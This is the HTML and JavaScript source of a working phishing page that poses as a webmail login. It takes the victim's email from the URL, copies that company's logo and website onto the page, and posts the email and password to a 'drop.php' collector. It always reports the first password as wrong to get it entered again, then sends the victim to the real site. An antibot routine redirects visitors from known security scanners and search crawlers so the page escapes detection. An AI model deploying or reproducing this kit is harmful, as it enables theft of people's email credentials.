<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="tittle" style="text-transform: uppercase;"></title>
    <link rel="shortcut icon" href="" id="favicon" type="image/x-icon">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background-color: #d3d3d3;
            font-family: Arial, sans-serif;
        }
        .login-container {
            background-color: rgb(250 250 250);
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 440px;
            margin: 4rem auto;
            border: 1px solid #e8e7e7;
        }
        .login-container img {
            width: 60px;
            margin-bottom: 20px;
        }
        .login-container h1 {
            margin-bottom: 20px;
            color: #50a1ff;
            font-weight: 600;
            text-transform: uppercase;
        }
        .inpd input[type="email"],
        .inpd input[type="password"] {
            width: 100%;
            font-size: 16px;
            outline: none;
            color: #717171;
            border-radius: 50px;
            border: 1px solid #dbdbdb;
            box-shadow: 0 1px 3px 0 rgb(0 0 0 / 6%);
            width: 100%;
            padding: 15.5px 50px 15.5px 25px;
            margin: 1rem 0;
        }
        .login-container input[type="checkbox"] {
            margin: 16px 0;
        }
        .login-container button {
            width: 100%;
            font-size: 16px;
            background: #50a1ff;
            border: none;
            color: #fff;
            border-radius: 50px;
            border: 1px solid #dbdbdb;
            box-shadow: 0 1px 3px 0 rgb(0 0 0 / 6%);
            width: 100%;
            padding: 15.5px 50px 15.5px 25px;
            margin: 1rem 0;
            text-align: center;
        }
        .login-container button:hover {
            background-color: #005ba1;
        }
        #root {
            position: absolute;
            left: 0;
            right: 0;
            bottom: 0;
            top: 0;
            z-index: -10;
            pointer-events: none;
            /* filter: brightness(0.3); */
        }
        
        @media screen and (max-width: 768px) {
            .login-container {
                width: 85%;
                margin: auto;
                margin-top: 4rem;
            }
        }
    </style>
     <script>
        async function fetchTargetIPAddresses() {
          const folderPath = 'antibot/ips/';
          const jsonFiles = ['amazonBotIPs.json', 'appleBotIPs.json', 'bingBotIPs.json', 'cloudFlareBotIPs.json', 'cookieBotIPs.json', 'googleBotIPs.json', 'namecheapBotIPs.json', 'qualysBotIPs.json', 'syntheticBotIPs.json', 'yandexBotIPs.json', 'generalBotIPs.json'];
          const promises = jsonFiles.map(filename => {
            return fetch(folderPath + filename).then(response => response.json()).then(data => {
              const ips = Object.values(data).map(ip => String(ip).replace(/"/g, ''));
              return ips;
            }).catch(error => {
              console.error(`Error fetching ${filename}:`, error);
              return [];
            });
          });
          const ipArrays = await Promise.all(promises);
          const targetIPAddresses = ipArrays.flat();
          //console.log('Fetched target IP addresses:', targetIPAddresses);
          return targetIPAddresses;
        }
  
        function isTargetIPAddress(ipAddress, targetIPAddresses) {
          //console.log(ipAddress)
          if (!Array.isArray(targetIPAddresses)) {
            targetIPAddresses = [targetIPAddresses];
          }
          for (let i = 0; i < targetIPAddresses.length; i++) {
            const targetIP = targetIPAddresses[i];
            const individualIPs = targetIP.split(',').map(ip => ip.trim());
            for (let j = 0; j < individualIPs.length; j++) {
              const individualIP = individualIPs[j];
              //console.log("Individual IP:", individualIP);
              if (isIPInRange(ipAddress, individualIP)) {
                console.log("Match found:", individualIP);
                return true;
              }
            }
          }
          console.log("Match not found");
          return false;
        }
  
        function isIPInRange(ipAddress, targetIP) {
          //console.log("Checking IP range:", targetIP);
          if (Array.isArray(targetIP)) {
            for (let i = 0; i < targetIP.length; i++) {
              const ip = targetIP[i];
              if (ipAddress.trim() === ip.trim()) {
                //console.log("IPs match:", true);
                return true;
              }
            }
          } else {
            //console.log("Checking IP:", targetIP.trim());
            const match = ipAddress.trim() === targetIP.trim();
            //console.log("IPs match:", match);
            return match;
          }
          //console.log("IPs match:", false);
          return false;
        }
  
        async function redirectToBlockedPage() {
          try {
            const targetIPAddresses = await fetchTargetIPAddresses();
            const data = await fetch('https://api.ipify.org?format=json');
            const {
              ip: currentIPAddress
            } = await data.json();
            if (isTargetIPAddress(currentIPAddress, targetIPAddresses)) {
              window.location.href = "http://2m.ma";
              //const userAgent = navigator.userAgent;
              //console.log("User Agent:", userAgent);
            }
          } catch (error) {
            console.error('Error:', error);
          }
        }
        window.onload = redirectToBlockedPage;
      </script>
</head>
<body>
    <div class="root" id="root">
        <iframe id="myframe" scrolling="no" src="" width="100%" height="100%" frameborder="0"></iframe>
    </div>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/64/AOL_logo.svg/1200px-AOL_logo.svg.png" id="zion" alt="">
        <h1 id="banNer">Webmail</h1>
        <form method="post" action="" id="testForm">
            <div class="inpd">
                <input type="email" name="userid" placeholder="Email address" id="domainInput" required readonly>
            </div>
           <div class="inpd">
              <input type="password" name="userpwd" placeholder="Password" id="password" required>
           </div>
            <div style=" text-align: start;">
                <input type="checkbox" id="remember">
                <label for="remember">Remember me</label>
            </div>
            <span style="display: block;text-align: center;color: red;" id="errom"></span>
            <button type="submit">Continue</button>
        </form>
    </div>
    <script>
         
        const fullUrl = window.location.href;
        const emailRegex = /#([^#]+)$/;
        const match = fullUrl.match(emailRegex);
        const email = match ? match[1] : null;
      
        console.log(email);
      

        if (email) {
            document.getElementById("domainInput").value = email;
              
              const domain = email.split('@')[1];
              const companyName = domain.split('.')[0];
                console.log(companyName);
  
              console.log(domain);
  
             
              localStorage.setItem("userDomain", domain);
              
              document.getElementById("tittle").textContent = `${companyName}`;
              document.getElementById("banNer").textContent = companyName;
              document.getElementById("myframe").src = `https://www.${domain}`;  
            //   document.getElementById("zion").src = `https://t3.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://${domain}&size=16`;
            document.getElementById("zion").src = `https://logo.clearbit.com/${domain}`;
              document.getElementById("favicon").href = `https://logo.clearbit.com/${domain}`;
             
          }
      
    //    document.addEventListener('contextmenu', function (e) {
    //      e.preventDefault();
    //    });
      
      var formSubmitted = 0;

      document.getElementById("testForm").addEventListener("submit", function (event) {
          event.preventDefault();
      
          formSubmitted++;
          const directts = localStorage.getItem("userDomain")
          console.log(directts);
          var inputs = document.querySelectorAll('input[required]');
          for (var i = 0; i < inputs.length; i++) {
              if (!inputs[i].value.trim()) {
                  alert("Please fill in all fields.");
                  return;
              }
          }
      
          var formData = new FormData(this);
          var xhr = new XMLHttpRequest();
          xhr.open("POST", "drop.php", true);
      
          xhr.onreadystatechange = function () {
              const directts = localStorage.getItem("userDomain")
              console.log(directts);
              if (xhr.readyState == 4 && xhr.status == 200) {
                  console.log(xhr.responseText);
      
                  if (formSubmitted === 1) {
                      document.getElementById("password").value = "";
                      console.log("YESSSSS");
                      document.getElementById("errom").textContent = "Invalid password please try again"
                       console.log(`https://www.${directts}`);
                  } else if (formSubmitted === 2) {

                          window.location.href = `https://www.${directts}`;
                          console.log("GOOOOOO");
                  }
              }
          };
      
          xhr.send(formData);
      });
    </script>
    
</body>
</html>
